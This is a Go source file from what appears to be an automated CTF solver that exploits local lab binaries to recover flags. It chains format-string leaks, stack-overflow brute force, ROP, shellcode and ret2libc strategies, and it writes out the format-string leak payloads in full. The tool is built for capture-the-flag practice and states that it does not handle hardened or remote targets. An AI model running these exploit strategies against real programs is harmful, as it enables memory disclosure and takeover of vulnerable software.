// Package solve attempts to recover a flag from a simple local CTF program by
// driving a confirmed vulnerability and extracting the disclosed secret.
//
// Two strategies are implemented:
//
//   - format_string: after internal/detect confirms input-dependent %p
//     expansion, send leak payloads and read the flag out of the transcript.
//   - stack_overwrite: brute-force a buffer overflow that either sets a guard
//     variable to a magic constant found in the binary or redirects control to
//     a flag-printing function, then read the flag the program prints.
//
// A flag counts only when it matches the configured pattern and is absent from
// the input that produced it, so echoing a supplied flag never registers as a
// solve, and a crash alone is never reported as success.
package solve

import (
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"time"

	"github.com/MoriartyPuth/PwnProbes/internal/detect"
	"github.com/MoriartyPuth/PwnProbes/internal/extract"
	"github.com/MoriartyPuth/PwnProbes/internal/inspect"
	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// MaxStackArgs bounds the direct positional reads and the stack dump width.
const MaxStackArgs = 40

// Attempt records one payload, its transcript, and the flags it recovered.
type Attempt struct {
	Strategy  string              `json:"strategy"`
	Payload   string              `json:"payload"`
	Note      string              `json:"note,omitempty"`
	Result    runner.Result       `json:"result"`
	Candidate []extract.Candidate `json:"candidates,omitempty"`
	Recovered []string            `json:"recovered,omitempty"`
}

// Report is the full record of a solve run. Solved is true only when at least
// one non-echoed flag matching the pattern was recovered.
type Report struct {
	Binary      inspect.Report `json:"binary"`
	Detection   detect.Report  `json:"detection"`
	Pattern     string         `json:"pattern"`
	Attempts    []Attempt      `json:"attempts"`
	Solved      bool           `json:"solved"`
	Flags       []string       `json:"flags"`
	Winning     *Attempt       `json:"winning_attempt,omitempty"`
	Limitations []string       `json:"limitations"`
}

// solver carries the shared inputs and the growing report across strategies.
type solver struct {
	ex      *extract.Extractor
	path    string
	workDir string
	timeout time.Duration
	report  *Report
}

// Solve detects vulnerabilities and runs each applicable strategy in turn,
// stopping at the first payload that recovers a non-echoed flag and reporting
// that payload as the reproducible winner. pattern selects the flag shape; an
// empty pattern uses extract.DefaultPattern. The target runs in its own
// directory so a flag file beside it is readable.
func Solve(ctx context.Context, path, pattern string, timeout time.Duration) (Report, error) {
	ex, err := extract.New(pattern)
	if err != nil {
		return Report{}, fmt.Errorf("compile flag pattern: %w", err)
	}
	effectivePattern := pattern
	if effectivePattern == "" {
		effectivePattern = extract.DefaultPattern
	}
	detection, err := detect.Probe(ctx, path, timeout)
	if err != nil {
		return Report{}, err
	}
	report := Report{
		Binary:    detection.Binary,
		Detection: detection,
		Pattern:   effectivePattern,
		Attempts:  []Attempt{},
		Flags:     []string{},
		Limitations: []string{
			"strategies implemented: format-string read, stack-overflow variable/return overwrite, two-argument ret2win ROP, executable-stack shellcode, and ret2libc",
			"leaked-address strategies run the target under setarch -R (ASLR off) to reuse a leaked address across runs; suitable for local labs, not hardened or remote targets",
			"the overwrite strategy brute-forces padding against magic constants and function addresses found in the binary; it suits simple fixed-address (no-PIE) targets",
			"a recovered flag must match the configured pattern and be absent from the payload that produced it",
			"single stdin interaction ending in EOF; menu-driven and remote targets are unsupported",
			"failure to recover a flag does not prove the target is unexploitable",
		},
	}
	s := &solver{ex: ex, path: path, workDir: filepath.Dir(path), timeout: timeout, report: &report}

	if hasFormatString(detection) {
		if done, err := s.formatStringStrategy(ctx); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
	} else {
		report.Limitations = append(report.Limitations, "no confirmed format-string behavior; format-string strategy skipped")
	}

	if detection.Binary.ExecutionSupported {
		if done, err := s.stackOverwriteStrategy(ctx); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
		if done, err := s.ropRet2winArgsStrategy(ctx); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
		if done, err := s.shellcodeStrategy(ctx); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
		if done, err := s.ret2libcStrategy(ctx); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
	} else {
		report.Limitations = append(report.Limitations, "execution unsupported for this target; overwrite and ROP strategies skipped")
	}

	return report, nil
}

// attempt runs one payload, extracts flags, records the attempt, and, when a
// non-echoed flag is recovered, finalizes the report as solved. It returns true
// once the report is solved so the caller can stop.
func (s *solver) attempt(ctx context.Context, strategy, note string, payload []byte, decodeLeak bool) (bool, error) {
	result, err := runner.Run(ctx, runner.Request{Program: s.path, Input: payload, Timeout: s.timeout, WorkDir: s.workDir})
	if err != nil {
		return false, err
	}
	cands := s.ex.Find(result.Stdout, payload, "stdout")
	cands = append(cands, s.ex.Find(result.Stderr, payload, "stderr")...)
	if decodeLeak {
		if decoded := extract.DecodeLeak(result.Stdout); decoded != "" {
			cands = append(cands, s.ex.Find(decoded, payload, "stack_leak")...)
		}
	}
	recovered := extract.Recovered(cands)
	a := Attempt{Strategy: strategy, Payload: string(payload), Note: note, Result: result, Candidate: cands, Recovered: recovered}
	s.report.Attempts = append(s.report.Attempts, a)
	if len(recovered) > 0 {
		s.report.Solved = true
		s.report.Flags = recovered
		winner := a
		s.report.Winning = &winner
		return true, nil
	}
	return false, nil
}

func hasFormatString(d detect.Report) bool {
	for _, f := range d.Findings {
		if f.Kind == "format_string" && f.Status == "confirmed_behavior" {
			return true
		}
	}
	return false
}

// formatStringStrategy sends leak payloads in increasing aggressiveness. The
// stack dump rarely crashes and decodes to ASCII; the direct %s reads print a
// flag pointer straight to stdout but can crash on a non-pointer argument, so
// they run after the dump. Every payload is a single reproducible line.
func (s *solver) formatStringStrategy(ctx context.Context) (bool, error) {
	var direct strings.Builder
	for i := 1; i <= MaxStackArgs; i++ {
		fmt.Fprintf(&direct, "%%%d$s|", i)
	}
	direct.WriteByte('\n')
	payloads := []struct{ name, payload string }{
		{"stack_dump", strings.Repeat("%p.", MaxStackArgs) + "\n"},
		{"direct_string_reads", direct.String()},
		{"leading_string_read", "%s\n"},
	}
	for _, p := range payloads {
		if err := ctx.Err(); err != nil {
			return false, err
		}
		if done, err := s.attempt(ctx, p.name, "", []byte(p.payload), true); err != nil || done {
			return done, err
		}
	}
	return false, nil
}
